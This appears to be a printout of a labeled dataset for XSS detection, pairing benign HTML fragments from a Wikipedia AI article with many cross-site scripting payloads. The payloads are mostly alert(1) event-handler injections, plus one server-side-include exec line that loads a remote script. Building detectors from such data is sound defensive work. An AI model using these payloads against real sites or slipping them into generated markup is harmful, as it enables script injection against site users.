#   'Sentence': '<li id="cite_note-59"><span class="mw-cite-backlink"><b><a href="#cite_ref-59">^ </a> </b> ',
#   'Label': 0},
#  {'Unnamed: 0': 169,
#   'Sentence': '<style>:target {color: red;}</style><pre id=x style="transition:color 10s" ontransitioncancel=alert(1)></pre>',
#   'Label': 1},
#  {'Unnamed: 0': 170,
#   'Sentence': '<li><a href="/wiki/Photo_manipulation" title="Photo manipulation">Image manipulation </a> </li>',
#   'Label': 0},
#  {'Unnamed: 0': 171,
#   'Sentence': '<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><a id=x style="position:absolute;" onanimationcancel="alert(1)"></a>',
#   'Label': 1},
#  {'Unnamed: 0': 172,
#   'Sentence': '<main onfocusout=alert(1) tabindex=1 id=x></main><input autofocus>',
#   'Label': 1},
#  {'Unnamed: 0': 173,
#   'Sentence': '<time onclick="alert(1)">test</time>',
#   'Label': 1},
#  {'Unnamed: 0': 174, 'Sentence': '\t </span>', 'Label': 0},
#  {'Unnamed: 0': 175,
#   'Sentence': '<canvas onbeforepaste="alert(1)" contenteditable>test</canvas>',
#   'Label': 1},
#  {'Unnamed: 0': 176,
#   'Sentence': '<figure id=x tabindex=1 ondeactivate=alert(1)></figure><input id=y autofocus>',
#   'Label': 1},
#  {'Unnamed: 0': 177,
#   'Sentence': '<li><a href="/wiki/Centre_for_the_Study_of_Existential_Risk" title="Centre for the Study of Existential Risk">Centre for the Study of Existential Risk </a> </li>',
#   'Label': 0},
#  {'Unnamed: 0': 178,
#   'Sentence': '<li><cite id="CITEREFLenatGuha1989" class="citation book"><a href="/wiki/Douglas_Lenat" title="Douglas Lenat">Lenat, Douglas </a>; Guha, R. V. (1989). <i>Building Large Knowledge-Based Systems </i>. Addison-Wesley. <a href="/wiki/International_Standard_Book_Number" title="International Standard Book Number">ISBN </a>&#160;<a href="/wiki/Special:BookSources/978-0-201-51752-1" title="Special:BookSources/978-0-201-51752-1"><bdi>978-0-201-51752-1 </bdi> </a>. </cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Building+Large+Knowledge-Based+Systems&amp;rft.pub=Addison-Wesley&amp;rft.date=1989&amp;rft.isbn=978-0-201-51752-1&amp;rft.aulast=Lenat&amp;rft.aufirst=Douglas&amp;rft.au=Guha%2C+R.+V.&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence" class="Z3988"> ',
#   'Label': 0},
#  {'Unnamed: 0': 179,
#   'Sentence': '<li id="cite_note-Brain_simulation-153"><span class="mw-cite-backlink">^ <a href="#cite_ref-Brain_simulation_153-0"><sup><i><b>a </b> </i> </sup> </a> <a href="#cite_ref-Brain_simulation_153-1"><sup><i><b>b </b> </i> </sup> </a> ',
#   'Label': 0},
#  {'Unnamed: 0': 180,
#   'Sentence': '<ul><li><cite class="citation book"><a href="/wiki/David_Berlinski" title="David Berlinski">Berlinski, David </a> (2000). <a rel="nofollow" class="external text" href="https://archive.org/details/adventofalgorith0000berl"><i>The Advent of the Algorithm </i> </a>. Harcourt Books. <a href="/wiki/International_Standard_Book_Number" title="International Standard Book Number">ISBN </a>&#160;<a href="/wiki/Special:BookSources/978-0-15-601391-8" title="Special:BookSources/978-0-15-601391-8"><bdi>978-0-15-601391-8 </bdi> </a>. <a href="/wiki/OCLC" title="OCLC">OCLC </a>&#160;<a rel="nofollow" class="external text" href="//www.worldcat.org/oclc/46890682">46890682 </a>. </cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=The+Advent+of+the+Algorithm&amp;rft.pub=Harcourt+Books&amp;rft.date=2000&amp;rft_id=info%3Aoclcnum%2F46890682&amp;rft.isbn=978-0-15-601391-8&amp;rft.aulast=Berlinski&amp;rft.aufirst=David&amp;rft_id=https%3A%2F%2Farchive.org%2Fdetails%2Fadventofalgorith0000berl&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence" class="Z3988"> ',
#   'Label': 0},
#  {'Unnamed: 0': 181,
#   'Sentence': '<center onclick="alert(1)">test</center>',
#   'Label': 1},
#  {'Unnamed: 0': 182,
#   'Sentence': '<h1 draggable="true" ondragleave="alert(1)">test</h1>',
#   'Label': 1},
#  {'Unnamed: 0': 183,
#   'Sentence': '<div onkeyup="alert(1)" contenteditable>test</div>',
#   'Label': 1},
#  {'Unnamed: 0': 184,
#   'Sentence': '<marquee id=x tabindex=1 onbeforedeactivate=alert(1)></marquee><input autofocus>',
#   'Label': 1},
#  {'Unnamed: 0': 185,
#   'Sentence': '<dl draggable="true" ondrag="alert(1)">test</dl>',
#   'Label': 1},
#  {'Unnamed: 0': 186,
#   'Sentence': '<div onpointerout=alert(1)>XSS</div>',
#   'Label': 1},
#  {'Unnamed: 0': 187, 'Sentence': '\t </span> </h4>', 'Label': 0},
#  {'Unnamed: 0': 188,
#   'Sentence': '<style>:target {color:red;}</style><slot id=x style="transition:color 1s" ontransitionend=alert(1)></slot>',
#   'Label': 1},
#  {'Unnamed: 0': 189,
#   'Sentence': '<applet onmouseover="alert(1)">test</applet>',
#   'Label': 1},
#  {'Unnamed: 0': 190,
#   'Sentence': '<figure onbeforecut="alert(1)" contenteditable>test</figure>',
#   'Label': 1},
#  {'Unnamed: 0': 191,
#   'Sentence': '<canvas onmousemove="alert(1)">test</canvas>',
#   'Label': 1},
#  {'Unnamed: 0': 192,
#   'Sentence': '<h1 onpaste="alert(1)" contenteditable>test</h1>',
#   'Label': 1},
#  {'Unnamed: 0': 193,
#   'Sentence': '<li id="cite_note-ivak1971-253"><span class="mw-cite-backlink"><b><a href="#cite_ref-ivak1971_253-0">^ </a> </b> ',
#   'Label': 0},
#  {'Unnamed: 0': 194,
#   'Sentence': '<area onfocusout=alert(1) tabindex=1 id=x></area><input autofocus>',
#   'Label': 1},
#  {'Unnamed: 0': 195, 'Sentence': ' </div>', 'Label': 0},
#  {'Unnamed: 0': 196,
#   'Sentence': '<li id="cite_note-FOOTNOTERussellNorvig200918.12:_Learning_from_Examples:_Summary-231"><span class="mw-cite-backlink"><b><a href="#cite_ref-FOOTNOTERussellNorvig200918.12:_Learning_from_Examples:_Summary_231-0">^ </a> </b> ',
#   'Label': 0},
#  {'Unnamed: 0': 197,
#   'Sentence': '<textarea onpointermove=alert(1)>XSS</textarea>',
#   'Label': 1},
#  {'Unnamed: 0': 198, 'Sentence': '</body>', 'Label': 0},
#  {'Unnamed: 0': 199, 'Sentence': 'document.write', 'Label': 1},
#  {'Unnamed: 0': 200,
#   'Sentence': '<area onpointerenter=alert(1)>XSS</area>',
#   'Label': 1},
#  {'Unnamed: 0': 201,
#   'Sentence': '<marquee onbeforecut="alert(1)" contenteditable>test</marquee>',
#   'Label': 1},
#  {'Unnamed: 0': 202,
#   'Sentence': '<audio oncontextmenu="alert(1)">test</audio>',
#   'Label': 1},
#  {'Unnamed: 0': 203,
#   'Sentence': '<isindex onpointerup=alert(1)>XSS</isindex>',
#   'Label': 1},
#  {'Unnamed: 0': 204,
#   'Sentence': '<ul><li><a rel="nofollow" class="external text" href="http://www.ieee-cis.org/">IEEE Computational Intelligence Society </a> <a rel="nofollow" class="external text" href="https://web.archive.org/web/20080509191840/http://www.ieee-cis.org/">Archived </a> 9 May 2008 at the <a href="/wiki/Wayback_Machine" title="Wayback Machine">Wayback Machine </a> </li> </ul>',
#   'Label': 0},
#  {'Unnamed: 0': 205,
#   'Sentence': '<li id="cite_note-330"><span class="mw-cite-backlink"><b><a href="#cite_ref-330">^ </a> </b> ',
#   'Label': 0},
#  {'Unnamed: 0': 206,
#   'Sentence': '<strike onmouseup="alert(1)">test</strike>',
#   'Label': 1},
#  {'Unnamed: 0': 207,
#   'Sentence': '\t <div id="John_McCarthy" style="font-size:114%;margin:0 4em"><a href="/wiki/John_McCarthy_(computer_scientist)" title="John McCarthy (computer scientist)">John McCarthy </a> </div> </th> </tr><tr><td colspan="2" class="navbox-list navbox-odd" style="width:100%;padding:0px">',
#   'Label': 0},
#  {'Unnamed: 0': 208,
#   'Sentence': '<kbd id=x tabindex=1 onfocus=alert(1)></kbd>',
#   'Label': 1},
#  {'Unnamed: 0': 209,
#   'Sentence': '<table onbeforepaste="alert(1)" contenteditable>test</table>',
#   'Label': 1},
#  {'Unnamed: 0': 210,
#   'Sentence': '<hr draggable="true" ondragleave="alert(1)">test</hr>',
#   'Label': 1},
#  {'Unnamed: 0': 211,
#   'Sentence': '\t </span><link rel="mw-deduplicated-inline-style" href="mw-data:TemplateStyles:r935243608"/> ',
#   'Label': 0},
#  {'Unnamed: 0': 212,
#   'Sentence': '<summary onpaste="alert(1)" contenteditable>test</summary>',
#   'Label': 1},
#  {'Unnamed: 0': 213,
#   'Sentence': '<bdo id=x tabindex=1 onactivate=alert(1)></bdo>',
#   'Label': 1},
#  {'Unnamed: 0': 214,
#   'Sentence': '<video onmouseout="alert(1)">test</video>',
#   'Label': 1},
#  {'Unnamed: 0': 215,
#   'Sentence': '<nav onclick="alert(1)">test</nav>',
#   'Label': 1},
#  {'Unnamed: 0': 216, 'Sentence': '\t </span>', 'Label': 0},
#  {'Unnamed: 0': 217,
#   'Sentence': '\t <div style="padding:0em 0.25em">',
#   'Label': 0},
#  {'Unnamed: 0': 218,
#   'Sentence': '<noembed onkeyup="alert(1)" contenteditable>test</noembed>',
#   'Label': 1},
#  {'Unnamed: 0': 219,
#   'Sentence': '<area draggable="true" ondragstart="alert(1)">test</area>',
#   'Label': 1},
#  {'Unnamed: 0': 220,
#   'Sentence': '<li class="toclevel-3 tocsection-55"><a href="#Autonomous_weapons"><span class="tocnumber">8.2.5 ',
#   'Label': 0},
#  {'Unnamed: 0': 221,
#   'Sentence': '<video onpointermove=alert(1)>XSS</video>',
#   'Label': 1},
#  {'Unnamed: 0': 222,
#   'Sentence': '<input onchange=alert(1) value=xss>',
#   'Label': 1},
#  {'Unnamed: 0': 223,
#   'Sentence': '<center draggable="true" ondrag="alert(1)">test</center>',
#   'Label': 1},
#  {'Unnamed: 0': 224,
#   'Sentence': '<dd id=x tabindex=1 onbeforeactivate=alert(1)></dd>',
#   'Label': 1},
#  {'Unnamed: 0': 225,
#   'Sentence': '<ruby onblur=alert(1) tabindex=1 id=x></ruby><input autofocus>',
#   'Label': 1},
#  {'Unnamed: 0': 226,
#   'Sentence': '<li><a href="/wiki/Christof_Koch" title="Christof Koch">Koch, Christof </a>, "Proust among the Machines", <i><a href="/wiki/Scientific_American" title="Scientific American">Scientific American </a> </i>, vol. 321, no. 6 (December 2019), pp.&#160;46–49. <a href="/wiki/Christof_Koch" title="Christof Koch">Christof Koch </a> doubts the possibility of "intelligent" machines attaining <a href="/wiki/Consciousness" title="Consciousness">consciousness </a>, because "[e]ven the most sophisticated <a href="/wiki/Brain_simulation" title="Brain simulation">brain simulations </a> are unlikely to produce conscious <a href="/wiki/Feelings" class="mw-redirect" title="Feelings">feelings </a>." (p.&#160;48.) According to Koch, "Whether machines can become <a href="/wiki/Sentience" title="Sentience">sentient </a> [is important] for <a href="/wiki/Ethics" title="Ethics">ethical </a> reasons. If computers experience life through their own senses, they cease to be purely a means to an end determined by their usefulness to... humans. Per GNW [the <a href="/wiki/Global_Workspace_Theory#Global_neuronal_workspace" class="mw-redirect" title="Global Workspace Theory">Global Neuronal Workspace </a> theory], they turn from mere objects into subjects... with a <a href="/wiki/Point_of_view_(philosophy)" title="Point of view (philosophy)">point of view </a>.... Once computers\' <a href="/wiki/Cognitive_abilities" class="mw-redirect" title="Cognitive abilities">cognitive abilities </a> rival those of humanity, their impulse to push for legal and political <a href="/wiki/Rights" title="Rights">rights </a> will become irresistible – the right not to be deleted, not to have their memories wiped clean, not to suffer <a href="/wiki/Pain" title="Pain">pain </a> and degradation. The alternative, embodied by IIT [Integrated Information Theory], is that computers will remain only supersophisticated machinery, ghostlike empty shells, devoid of what we value most: the feeling of life itself." (p.&#160;49.) </li>',
#   'Label': 0},
#  {'Unnamed: 0': 227,
#   'Sentence': '<keygen onclick="alert(1)">test</keygen>',
#   'Label': 1},
#  {'Unnamed: 0': 228,
#   'Sentence': '<meter oncut="alert(1)" contenteditable>test</meter>',
#   'Label': 1},
#  {'Unnamed: 0': 229,
#   'Sentence': '<style>@keyframes x{}</style><body style="animation-name:x" onanimationstart="alert(1)"></body>',
#   'Label': 1},
#  {'Unnamed: 0': 230,
#   'Sentence': '\t </span> <span class="reference-text"><cite class="citation news"><a rel="nofollow" class="external text" href="https://www.bbc.com/news/technology-35785875">"Artificial intelligence: Google\'s AlphaGo beats Go master Lee Se-dol" </a>. <i>BBC News </i>. 12 March 2016. <a rel="nofollow" class="external text" href="https://web.archive.org/web/20160826103910/http://www.bbc.com/news/technology-35785875">Archived </a> from the original on 26 August 2016<span class="reference-accessdate">. Retrieved <span class="nowrap">1 October ',
#   'Label': 0},
#  {'Unnamed: 0': 231,
#   'Sentence': '<strike onpointerover=alert(1)>XSS</strike>',
#   'Label': 1},
#  {'Unnamed: 0': 232, 'Sentence': '\t </span> ', 'Label': 0},
#  {'Unnamed: 0': 233,
#   'Sentence': '<style>:target {color:red;}</style><picture id=x style="transition:color 1s" ontransitionend=alert(1)></picture>',
#   'Label': 1},
#  {'Unnamed: 0': 234,
#   'Sentence': '<main onmousedown="alert(1)">test</main>',
#   'Label': 1},
#  {'Unnamed: 0': 235,
#   'Sentence': '<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><figcaption id=x style="position:absolute;" onanimationcancel="alert(1)"></figcaption>',
#   'Label': 1},
#  {'Unnamed: 0': 236, 'Sentence': '</head>', 'Label': 0},
#  {'Unnamed: 0': 237,
#   'Sentence': '<command oncontextmenu="alert(1)">test</command>',
#   'Label': 1},
#  {'Unnamed: 0': 238,
#   'Sentence': '<style>@keyframes x{}</style><title style="animation-name:x" onanimationstart="alert(1)"></title>',
#   'Label': 1},
#  {'Unnamed: 0': 239,
#   'Sentence': '<link onkeydown="alert(1)" contenteditable>test</link>',
#   'Label': 1},
#  {'Unnamed: 0': 240,
#   'Sentence': '<ul><li><a href="#CITEREFMcCorduck2004">McCorduck 2004 </a>, pp.&#160;430–435 </li>',
#   'Label': 0},
#  {'Unnamed: 0': 241,
#   'Sentence': '<command onpointerover=alert(1)>XSS</command>',
#   'Label': 1},
#  {'Unnamed: 0': 242,
#   'Sentence': '\t </span> <span class="reference-text"><cite class="citation journal">Samuel, A. L. (July 1959). "Some Studies in Machine Learning Using the Game of Checkers". <i>IBM Journal of Research and Development </i>. <b>3 </b> (3): 210–229. <a href="/wiki/CiteSeerX" title="CiteSeerX">CiteSeerX </a>&#160;<span class="cs1-lock-free" title="Freely accessible"><a rel="nofollow" class="external text" href="//citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.368.2254">10.1.1.368.2254 </a> ',
#   'Label': 0},
#  {'Unnamed: 0': 243,
#   'Sentence': '<input id=x tabindex=1 onactivate=alert(1)></input>',
#   'Label': 1},
#  {'Unnamed: 0': 244,
#   'Sentence': '<tr onpaste="alert(1)" contenteditable>test</tr>',
#   'Label': 1},
#  {'Unnamed: 0': 245, 'Sentence': ' </li>', 'Label': 0},
#  {'Unnamed: 0': 246,
#   'Sentence': '<samp onmousemove="alert(1)">test</samp>',
#   'Label': 1},
#  {'Unnamed: 0': 247,
#   'Sentence': '<script onmousemove="alert(1)">test</script>',
#   'Label': 1},
#  {'Unnamed: 0': 248,
#   'Sentence': '<td onmouseenter="alert(1)">test</td>',
#   'Label': 1},
#  {'Unnamed: 0': 249,
#   'Sentence': '<style>@keyframes slidein {}</style><ins style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></ins>',
#   'Label': 1},
#  {'Unnamed: 0': 250,
#   'Sentence': '<form draggable="true" ondragend="alert(1)">test</form>',
#   'Label': 1},
#  {'Unnamed: 0': 251,
#   'Sentence': '\t </span>. </cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Wired+UK&amp;rft.atitle=The+UK+is+about+to+Start+Testing+Self-Driving+Truck+Platoons&amp;rft.date=2017-08-24&amp;rft.aulast=Burgess&amp;rft.aufirst=Matt&amp;rft_id=https%3A%2F%2Fwww.wired.co.uk%2Farticle%2Fuk-trial-self-driving-trucks-platoons-roads&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence" class="Z3988"> ',
#   'Label': 0},
#  {'Unnamed: 0': 252,
#   'Sentence': '<div role="navigation" class="navbox" aria-labelledby="Subfields_of_and_cyberneticians_involved_in_cybernetics" style="padding:3px"><table class="nowraplinks mw-collapsible autocollapse navbox-inner" style="border-spacing:0;background:transparent;color:inherit"><tbody><tr><th scope="col" class="navbox-title" colspan="2">',
#   'Label': 0},
#  {'Unnamed: 0': 253,
#   'Sentence': '<iframe onmouseenter="alert(1)">test</iframe>',
#   'Label': 1},
#  {'Unnamed: 0': 254,
#   'Sentence': '<listing onkeydown="alert(1)" contenteditable>test</listing>',
#   'Label': 1},
#  {'Unnamed: 0': 255, 'Sentence': '<svg><ol onload=alert(1)></ol>', 'Label': 1},
#  {'Unnamed: 0': 256, 'Sentence': ' </li>', 'Label': 0},
#  {'Unnamed: 0': 257,
#   'Sentence': '<base onmouseover="alert(1)">test</base>',
#   'Label': 1},
#  {'Unnamed: 0': 258, 'Sentence': '\t </span>', 'Label': 0},
#  {'Unnamed: 0': 259,
#   'Sentence': '<style>@keyframes x{}</style><plaintext style="animation-name:x" onanimationend="alert(1)"></plaintext>',
#   'Label': 1},
#  {'Unnamed: 0': 260,
#   'Sentence': '<dt><a class="reference internal" href="topics/deploy.html"><span class="doc">Deploying Spiders',
#   'Label': 0},
#  {'Unnamed: 0': 261, 'Sentence': '\t </span>', 'Label': 0},
#  {'Unnamed: 0': 262,
#   'Sentence': '<keygen onmouseleave="alert(1)">test</keygen>',
#   'Label': 1},
#  {'Unnamed: 0': 263,
#   'Sentence': '<dd>The brain can be simulated by machines and because brains are intelligent, simulated brains must also be intelligent; thus machines can be intelligent. <a href="/wiki/Hans_Moravec" title="Hans Moravec">Hans Moravec </a>, <a href="/wiki/Ray_Kurzweil" title="Ray Kurzweil">Ray Kurzweil </a> and others have argued that it is technologically feasible to copy the brain directly into hardware and software and that such a simulation will be essentially identical to the original.<sup id="cite_ref-Brain_simulation_153-1" class="reference"><a href="#cite_note-Brain_simulation-153">&#91;150&#93; </a> </sup> </dd> </dl>',
#   'Label': 0},
#  {'Unnamed: 0': 264, 'Sentence': ' </li>', 'Label': 0},
#  {'Unnamed: 0': 265,
#   'Sentence': '<hr id=x tabindex=1 onactivate=alert(1)></hr>',
#   'Label': 1},
#  {'Unnamed: 0': 266, 'Sentence': '\t </span> </h3>', 'Label': 0},
#  {'Unnamed: 0': 267,
#   'Sentence': '<style>:target {color:red;}</style><embed id=x style="transition:color 1s" ontransitionend=alert(1)></embed>',
#   'Label': 1},
#  {'Unnamed: 0': 268,
#   'Sentence': '<bdo onpointerdown=alert(1)>XSS</bdo>',
#   'Label': 1},
#  {'Unnamed: 0': 269,
#   'Sentence': ' </div> </td> </tr><tr><th scope="row" class="navbox-group" style="width:1%"><a href="/wiki/Software_development" title="Software development">Software development </a> </th><td class="navbox-list navbox-even" style="text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px">',
#   'Label': 0},
#  {'Unnamed: 0': 270,
#   'Sentence': '<blockquote onbeforepaste="alert(1)" contenteditable>test</blockquote>',
#   'Label': 1},
#  {'Unnamed: 0': 271,
#   'Sentence': '\t </span><span class="mw-editsection"><span class="mw-editsection-bracket">[ ',
#   'Label': 0},
#  {'Unnamed: 0': 272,
#   'Sentence': '<command onfocusout=alert(1) tabindex=1 id=x></command><input autofocus>',
#   'Label': 1},
#  {'Unnamed: 0': 273,
#   'Sentence': '<fieldset oncopy="alert(1)" contenteditable>test</fieldset>',
#   'Label': 1},
#  {'Unnamed: 0': 274,
#   'Sentence': '<basefont onpointerup=alert(1)>XSS</basefont>',
#   'Label': 1},
#  {'Unnamed: 0': 275,
#   'Sentence': '<li id="cite_note-378"><span class="mw-cite-backlink"><b><a href="#cite_ref-378">^ </a> </b> ',
#   'Label': 0},
#  {'Unnamed: 0': 276,
#   'Sentence': '<li>Try the <a class="reference internal" href="faq.html"><span class="doc">FAQ',
#   'Label': 0},
#  {'Unnamed: 0': 277,
#   'Sentence': '<form ondblclick="alert(1)">test</form>',
#   'Label': 1},
#  {'Unnamed: 0': 278,
#   'Sentence': '<li><a href="#CITEREFLugerStubblefield2004">Luger &amp; Stubblefield 2004 </a>, pp.&#160;45–50 </li>',
#   'Label': 0},
#  {'Unnamed: 0': 279,
#   'Sentence': '\t </span> <span class="toctext">Perception ',
#   'Label': 0},
#  {'Unnamed: 0': 280,
#   'Sentence': '<li id="cite_note-Decision_tree-217"><span class="mw-cite-backlink"><b><a href="#cite_ref-Decision_tree_217-0">^ </a> </b> ',
#   'Label': 0},
#  {'Unnamed: 0': 281, 'Sentence': ' </li>', 'Label': 0},
#  {'Unnamed: 0': 282,
#   'Sentence': '<image srcset=1 onerror=alert(1)>',
#   'Label': 1},
#  {'Unnamed: 0': 283,
#   'Sentence': '<address id=x tabindex=1 onactivate=alert(1)></address>',
#   'Label': 1},
#  {'Unnamed: 0': 284,
#   'Sentence': '<tr onpointerup=alert(1)>XSS</tr>',
#   'Label': 1},
#  {'Unnamed: 0': 285,
#   'Sentence': '\t </span> <span class="reference-text"><cite class="citation journal">Smoliar, Stephen W.; Zhang, HongJiang (1994). "Content based video indexing and retrieval". <i>IEEE Multimedia </i>. <b>1 </b> (2): 62–72. <a href="/wiki/Digital_object_identifier" title="Digital object identifier">doi </a>:<a rel="nofollow" class="external text" href="https://doi.org/10.1109%2F93.311653">10.1109/93.311653 </a>. </cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=IEEE+Multimedia&amp;rft.atitle=Content+based+video+indexing+and+retrieval&amp;rft.volume=1&amp;rft.issue=2&amp;rft.pages=62-72&amp;rft.date=1994&amp;rft_id=info%3Adoi%2F10.1109%2F93.311653&amp;rft.aulast=Smoliar&amp;rft.aufirst=Stephen+W.&amp;rft.au=Zhang%2C+HongJiang&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence" class="Z3988"> ',
#   'Label': 0},
#  {'Unnamed: 0': 286,
#   'Sentence': '<header id=x tabindex=1 onfocus=alert(1)></header>',
#   'Label': 1},
#  {'Unnamed: 0': 287,
#   'Sentence': '<li><a href="/wiki/Computational_geometry" title="Computational geometry">Computational geometry </a> </li> </ul>',
#   'Label': 0},
#  {'Unnamed: 0': 288,
#   'Sentence': '<track onmouseleave="alert(1)">test</track>',
#   'Label': 1},
#  {'Unnamed: 0': 289, 'Sentence': '\t </span> </li>', 'Label': 0},
# ...
#   'Label': 0},
#  {'Unnamed: 0': 927,
#   'Sentence': '<code onkeydown="alert(1)" contenteditable>test</code>',
#   'Label': 1},
#  {'Unnamed: 0': 928,
#   'Sentence': '<li><a href="/wiki/Imre_Lakatos" title="Imre Lakatos">Imre Lakatos </a> </li>',
#   'Label': 0},
#  {'Unnamed: 0': 929,
#   'Sentence': '<li><cite id="CITEREFNeedham1986" class="citation book"><a href="/wiki/Joseph_Needham" title="Joseph Needham">Needham, Joseph </a> (1986). <a href="/wiki/Science_and_Civilization_in_China" class="mw-redirect" title="Science and Civilization in China"><i>Science and Civilization in China: Volume 2 </i> </a>. Caves Books Ltd. </cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Science+and+Civilization+in+China%3A+Volume+2&amp;rft.pub=Caves+Books+Ltd.&amp;rft.date=1986&amp;rft.aulast=Needham&amp;rft.aufirst=Joseph&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence" class="Z3988"> ',
#   'Label': 0},
#  {'Unnamed: 0': 930,
#   'Sentence': '<track onpointerenter=alert(1)>XSS</track>',
#   'Label': 1},
#  {'Unnamed: 0': 931,
#   'Sentence': '<style>@keyframes slidein {}</style><html style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></html>',
#   'Label': 1},
#  {'Unnamed: 0': 932,
#   'Sentence': '<legend onpointerup=alert(1)>XSS</legend>',
#   'Label': 1},
#  {'Unnamed: 0': 933,
#   'Sentence': '<!--#exec cmd="/bin/echo \'<SCR\'"--><!--#exec cmd="/bin/echo \'IPT SRC=http://.rocks/.js></SCRIPT>\'"',
#   'Label': 1},
#  {'Unnamed: 0': 934,
#   'Sentence': '\t </span> <span class="reference-text"><cite class="citation news">Buckley, Chris; Mozur, Paul (22 May 2019). <a rel="nofollow" class="external text" href="https://www.nytimes.com/2019/05/22/world/asia/china-surveillance-xinjiang.html">"How China Uses High-Tech Surveillance to Subdue Minorities" </a>. <i>The New York Times </i>. </cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=The+New+York+Times&amp;rft.atitle=How+China+Uses+High-Tech+Surveillance+to+Subdue+Minorities&amp;rft.date=2019-05-22&amp;rft.aulast=Buckley&amp;rft.aufirst=Chris&amp;rft.au=Mozur%2C+Paul&amp;rft_id=https%3A%2F%2Fwww.nytimes.com%2F2019%2F05%2F22%2Fworld%2Fasia%2Fchina-surveillance-xinjiang.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence" class="Z3988"> ',
#   'Label': 0},
#  {'Unnamed: 0': 935,
#   'Sentence': '\t </span> <span class="toctext">Search and optimization ',
#   'Label': 0},
#  {'Unnamed: 0': 936,
#   'Sentence': '<nobr onpointerdown=alert(1)>XSS</nobr>',
#   'Label': 1},
#  {'Unnamed: 0': 937,
#   'Sentence': '<div draggable="true" contenteditable>drag me</div><slot ondragover=alert(1) contenteditable>drop here</slot>',
#   'Label': 1},
#  {'Unnamed: 0': 938,
#   'Sentence': '<link onmouseover="alert(1)">test</link>',
#   'Label': 1},
#  {'Unnamed: 0': 939,
#   'Sentence': ' </div> </td> </tr><tr><th scope="row" class="navbox-group" style="width:1%">Mathematics<br />of computing </th><td class="navbox-list navbox-odd" style="text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px">',
#   'Label': 0},
#  {'Unnamed: 0': 940,
#   'Sentence': '\t </span><link rel="mw-deduplicated-inline-style" href="mw-data:TemplateStyles:r935243608"/> </li>',
#   'Label': 0},
#  {'Unnamed: 0': 941,
#   'Sentence': '<li><a href="/wiki/Panpsychism" title="Panpsychism">Panpsychism </a> </li>',
#   'Label': 0},
#  {'Unnamed: 0': 942,
#   'Sentence': ' </p><p>Simple exhaustive searches<sup id="cite_ref-Uninformed_search_188-0" class="reference"><a href="#cite_note-Uninformed_search-188">&#91;184&#93; </a> </sup> are rarely sufficient for most real-world problems: the <a href="/wiki/Search_algorithm" title="Search algorithm">search space </a> (the number of places to search) quickly grows to <a href="/wiki/Astronomically_large" class="mw-redirect" title="Astronomically large">astronomical numbers </a>. The result is a search that is <a href="/wiki/Computation_time" class="mw-redirect" title="Computation time">too slow </a> or never completes. The solution, for many problems, is to use "<a href="/wiki/Heuristics" class="mw-redirect" title="Heuristics">heuristics </a>" or "rules of thumb" that prioritize choices in favor of those that are more likely to reach a goal and to do so in a shorter number of steps. In some search methodologies heuristics can also serve to entirely eliminate some choices that are unlikely to lead to a goal (called "<a href="/wiki/Pruning_(algorithm)" class="mw-redirect" title="Pruning (algorithm)">pruning </a> the <a href="/wiki/Search_tree" title="Search tree">search tree </a>"). <a href="/wiki/Heuristics" class="mw-redirect" title="Heuristics">Heuristics </a> supply the program with a "best guess" for the path on which the solution lies.<sup id="cite_ref-Informed_search_189-0" class="reference"><a href="#cite_note-Informed_search-189">&#91;185&#93; </a> </sup> Heuristics limit the search for solutions into a smaller sample size.<sup id="cite_ref-FOOTNOTETecuci2012_130-1" class="reference"><a href="#cite_note-FOOTNOTETecuci2012-130">&#91;127&#93; </a> </sup>',
#   'Label': 0},
#  {'Unnamed: 0': 943,
#   'Sentence': '\t </span> <span class="reference-text"><cite class="citation journal"><a rel="nofollow" class="external text" href="https://www.wired.com/2017/05/win-china-alphagos-designers-explore-new-ai/">"After Win in China, AlphaGo\'s Designers Explore New AI" </a>. <i>Wired </i>. 27 May 2017. <a rel="nofollow" class="external text" href="https://web.archive.org/web/20170602234726/https://www.wired.com/2017/05/win-china-alphagos-designers-explore-new-ai/">Archived </a> from the original on 2 June 2017. </cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Wired&amp;rft.atitle=After+Win+in+China%2C+AlphaGo%27s+Designers+Explore+New+AI&amp;rft.date=2017-05-27&amp;rft_id=https%3A%2F%2Fwww.wired.com%2F2017%2F05%2Fwin-china-alphagos-designers-explore-new-ai%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence" class="Z3988"> ',
#   'Label': 0},
#  {'Unnamed: 0': 944,
#   'Sentence': '<base onmousemove="alert(1)">test</base>',
#   'Label': 1},
#  {'Unnamed: 0': 945,
